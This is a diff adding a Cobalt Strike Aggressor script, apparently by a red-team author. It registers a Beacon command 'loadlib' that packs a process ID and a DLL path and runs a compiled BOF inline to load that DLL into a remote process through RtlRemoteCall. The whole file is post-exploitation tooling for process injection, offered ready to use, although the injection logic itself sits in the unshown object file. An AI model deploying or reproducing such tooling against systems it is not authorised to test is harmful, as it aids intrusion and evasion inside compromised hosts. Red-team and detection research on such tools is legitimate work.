@@ -1,0 +1,34 @@
+# author REDMED-X
+
+beacon_command_register(
+	"loadlib", "Load DLL from disk in remote process via RPC call.",
+	"INFO:\nLoad a on disk present DLL via RtlRemoteCall API in a remote process.\nDepending on the process from which you run this tool, it may or may not work.\n\nOPTIONS:\n[pid]: target process to load the DLL into\n[path]: full path to the on disk present DLL\n\n" .
+	"USAGE:\nloadlib <pid> <path to dll>\n\n");
+
+
+alias loadlib {
+    $bid = $1;
+    $pid = $2;
+    $path = $3;
+	
+	if ($pid eq "" || $path eq "") {
+		berror($bid, "Please make sure that both the PID and PATH are specified.");
+		return;
+	}
+	
+	
+    # Read in the right BOF file
+    $handle = openf(script_resource("loadlib.o"));
+    $data   = readb($handle, -1);
+    closef($handle);
+	
+	
+    # Pack our arguments
+    $arg_data  = bof_pack($bid, "iz", $pid, $path);
+    
+	blog($bid, "Tasked to load DLL in remote process..");
+	
+    beacon_inline_execute($bid, $data, "go", $arg_data);
+}
+
+
